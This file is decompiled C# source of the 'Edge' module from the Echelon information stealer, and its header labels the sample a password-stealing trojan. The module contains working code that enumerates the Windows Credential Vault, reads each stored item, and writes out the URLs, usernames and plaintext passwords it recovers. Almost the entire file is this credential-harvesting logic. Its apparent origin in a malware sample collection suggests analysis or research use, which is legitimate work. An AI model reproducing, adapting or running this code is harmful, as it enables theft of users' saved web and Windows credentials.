// Decompiled with JetBrains decompiler
// Type: Echelon.Edge
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Echelon
{
  internal class Edge
  {
    public static int count;

    public static void Start(string Browsers)
    {
      try
      {
        DesktopWriter.SetDirectory(Browsers);
        Version version = Environment.OSVersion.Version;
        int major = version.Major;
        int minor = version.Minor;
        int vaultCount = 0;
        IntPtr zero1 = IntPtr.Zero;
        int num1 = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref zero1);
        if (num1 != 0)
          DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vaults. Error (0x" + num1.ToString() + ")"));
        IntPtr ptr1 = zero1;
        Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>()
        {
          {
            new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"),
            "Windows Secure Note"
          },
          {
            new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"),
            "Windows Web Password Credential"
          },
          {
            new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"),
            "Windows Credential Picker Protector"
          },
          {
            new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"),
            "Web Credentials"
          },
          {
            new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"),
            "Windows Credentials"
          },
          {
            new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"),
            "Windows Domain Certificate Credential"
          },
          {
            new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"),
            "Windows Domain Password Credential"
          },
          {
            new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"),
            "Windows Extended Credential"
          },
          {
            new Guid("00000000-0000-0000-0000-000000000000"),
            (string) null
          }
        };
        for (int index1 = 0; index1 < vaultCount; ++index1)
        {
          Guid vaultGuid = new Guid(Marshal.PtrToStructure(ptr1, typeof (Guid)).ToString());
          ptr1 = (IntPtr) (ptr1.ToInt64() + (long) Marshal.SizeOf(typeof (Guid)));
          IntPtr zero2 = IntPtr.Zero;
          string str = dictionary.ContainsKey(vaultGuid) ? dictionary[vaultGuid] : vaultGuid.ToString();
          num1 = VaultCli.VaultOpenVault(ref vaultGuid, 0U, ref zero2);
          if (num1 != 0)
            DesktopWriter.WriteLine(string.Format("Unable to open the following vault: " + str + ". Error: 0x" + num1.ToString()));
          int vaultItemCount = 0;
          IntPtr zero3 = IntPtr.Zero;
          num1 = VaultCli.VaultEnumerateItems(zero2, 512, ref vaultItemCount, ref zero3);
          if (num1 != 0)
            DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vault items from the following vault: " + str + ". Error 0x" + num1.ToString()));
          IntPtr ptr2 = zero3;
          if (vaultItemCount > 0)
          {
            for (int index2 = 1; index2 <= vaultItemCount; ++index2)
            {
              Type type = major < 6 || minor < 2 ? typeof (VaultCli.VAULT_ITEM_WIN7) : typeof (VaultCli.VAULT_ITEM_WIN8);
              object structure1 = Marshal.PtrToStructure(ptr2, type);
              ptr2 = (IntPtr) (ptr2.ToInt64() + (long) Marshal.SizeOf(type));
              IntPtr zero4 = IntPtr.Zero;
              Guid schemaId = new Guid(structure1.GetType().GetField("SchemaId").GetValue(structure1).ToString());
              IntPtr num2 = (IntPtr) structure1.GetType().GetField("pResourceElement").GetValue(structure1);
              IntPtr num3 = (IntPtr) structure1.GetType().GetField("pIdentityElement").GetValue(structure1);
              long num4 = (long) (ulong) structure1.GetType().GetField("LastModified").GetValue(structure1);
              IntPtr zero5 = IntPtr.Zero;
              if (major < 6 || minor < 2)
              {
                num1 = VaultCli.VaultGetItem_WIN7(zero2, ref schemaId, num2, num3, IntPtr.Zero, 0, ref zero4);
              }
              else
              {
                zero5 = (IntPtr) structure1.GetType().GetField("pPackageSid").GetValue(structure1);
                num1 = VaultCli.VaultGetItem_WIN8(zero2, ref schemaId, num2, num3, zero5, IntPtr.Zero, 0, ref zero4);
              }
              if (num1 != 0)
                DesktopWriter.WriteLine(string.Format("Error occured while retrieving vault item. Error: 0x" + num1.ToString()));
              object structure2 = Marshal.PtrToStructure(zero4, type);
              object vaultElementValue1 = GetVaultElementValue((IntPtr) structure2.GetType().GetField("pAuthenticatorElement").GetValue(structure2));
              object obj = (object) null;
              if (zero5 != IntPtr.Zero)
                obj = GetVaultElementValue(zero5);
              if (vaultElementValue1 != null)
              {
                object vaultElementValue2 = GetVaultElementValue(num2);
                if (vaultElementValue2 != null)
                  DesktopWriter.WriteLine(string.Format("Url: {0}", vaultElementValue2));
                object vaultElementValue3 = GetVaultElementValue(num3);
                if (vaultElementValue3 != null)
                  DesktopWriter.WriteLine(string.Format("Username: {0}", vaultElementValue3));
                if (obj != null)
                  DesktopWriter.WriteLine(string.Format("PacakgeSid: {0}", obj));
                DesktopWriter.WriteLine(string.Format("Password: {0}\n\n", vaultElementValue1));
                ++Edge.count;
              }
            }
          }
        }
      }
      catch
      {
      }

      static object GetVaultElementValue(IntPtr vaultElementPtr)
      {
        object structure = Marshal.PtrToStructure(vaultElementPtr, typeof (VaultCli.VAULT_ITEM_ELEMENT));
        object obj = structure.GetType().GetField("Type").GetValue(structure);
        IntPtr ptr = (IntPtr) (vaultElementPtr.ToInt64() + 16L);
        object vaultElementValue;
        switch ((int) obj)
        {
          case 0:
            vaultElementValue = (object) (bool) (object) Marshal.ReadByte(ptr);
            break;
          case 1:
            vaultElementValue = (object) Marshal.ReadInt16(ptr);
            break;
          case 2:
            vaultElementValue = (object) Marshal.ReadInt16(ptr);
            break;
          case 3:
            vaultElementValue = (object) Marshal.ReadInt32(ptr);
            break;
          case 4:
            vaultElementValue = (object) Marshal.ReadInt32(ptr);
            break;
          case 5:
            vaultElementValue = Marshal.PtrToStructure(ptr, typeof (double));
            break;
          case 6:
            vaultElementValue = Marshal.PtrToStructure(ptr, typeof (Guid));
            break;
          case 7:
            vaultElementValue = (object) Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptr));
            break;
          case 12:
            vaultElementValue = (object) new SecurityIdentifier(Marshal.ReadIntPtr(ptr)).Value;
            break;
          default:
            vaultElementValue = (object) null;
            break;
        }
        return vaultElementValue;
      }
    }
  }
}
